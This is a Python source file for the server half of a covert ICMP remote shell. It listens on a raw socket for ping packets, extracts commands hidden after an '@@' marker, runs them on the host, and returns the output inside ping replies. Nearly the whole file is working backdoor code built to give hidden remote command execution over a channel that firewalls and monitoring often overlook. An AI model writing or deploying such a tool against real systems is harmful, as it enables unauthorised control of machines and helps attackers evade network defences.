import argparse
import re
import socket

from icmp_remote_shell.common import execute, send_one, ICMP_ECHO_REQUEST_TYPE


def parse_args():
    parser = argparse.ArgumentParser(description="A simple server that communicates \n"
                                                 "with client via covert ICMP channel\n"
                                                 "executes commands and sends output back to client")
    parser.add_argument("host", help="The interface to listen requests")
    parser.add_argument("ping_delay", help="Delay between answer pings", nargs='?', type=int, default=1)
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    host = args.host
    ping_delay = args.ping_delay
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind((host, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    #  s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    print("Server Started......")
    while True:
        # while 1:
        data = s.recvfrom(65565)
        d1 = data[0]
        if bytearray(d1)[20] != ICMP_ECHO_REQUEST_TYPE:
            continue
        d1 = str(d1)
        data1 = re.search('@@(.*)', d1)
        command = data1.group(0)
        cmd = command[2:len(command) - 1]
        d = data[1]
        d1 = str(d)
        ip = d1[2:-5]
        # print ip
        print(cmd)  # Holding the command to execute
        print(ip)  # Holding the destination address to send the ping
        output = execute(cmd)
        for line in output.readlines():
            send_one(ip, ping_delay, line)
